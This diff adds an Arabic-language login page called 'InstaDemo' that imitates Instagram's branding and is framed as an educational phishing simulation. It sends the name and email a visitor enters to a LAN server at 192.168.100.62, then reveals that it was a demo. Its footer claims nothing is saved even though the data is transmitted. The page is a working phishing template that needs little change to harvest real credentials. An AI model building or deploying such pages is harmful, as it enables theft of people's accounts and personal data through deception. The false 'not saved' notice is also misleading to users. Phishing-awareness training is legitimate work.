@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>InstaDemo</title>
+<style>
+body{margin:0;font-family:Arial;background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);height:100vh;display:flex;justify-content:center;align-items:center;}
+.card{background:#fff;padding:40px;border-radius:12px;width:340px;box-shadow:0 10px 30px rgba(0,0,0,0.3);text-align:center;}
+.logo{font-size:36px;font-weight:bold;font-family:cursive;background:linear-gradient(45deg,#833ab4,#fd1d1d,#fcb045);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px;}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-size:14px;}
+button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:10px;}
+button:hover{background:#0077cc;}
+.note{font-size:11px;color:#888;margin-top:15px;}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">InstaDemo</div>
+<input id="name" placeholder="الاسم">
+<input id="email" placeholder="البريد الإلكتروني">
+<input id="pass" type="password" placeholder="كلمة المرور (تجريبية)">
+<button onclick="send()">تسجيل الدخول</button>
+<div class="note">هذه محاكاة تعليمية فقط - لا يتم حفظ بياناتك</div>
+</div>
+
+<script>
+async function send(){
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  
+  try {
+    await fetch("http://192.168.100.62", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({name: name, email: email})
+    });
+  } catch(e) {
+    console.log(e);
+  }
+  
+  document.body.innerHTML = '<div style="background:#fff;padding:40px;border-radius:12px;text-align:center;font-family:Arial;max-width:400px"><h2>🔔 هذه محاكاة تعليمية</h2><p>لو كانت صفحة حقيقية، لكانت بياناتك قد وصلت للمهاجم الآن.</p><p>في هذا المشروع، تصل البيانات فقط لصاحب المشروع للتوضيح.</p></div>';
+}
+</script>
+</body>
+</html>
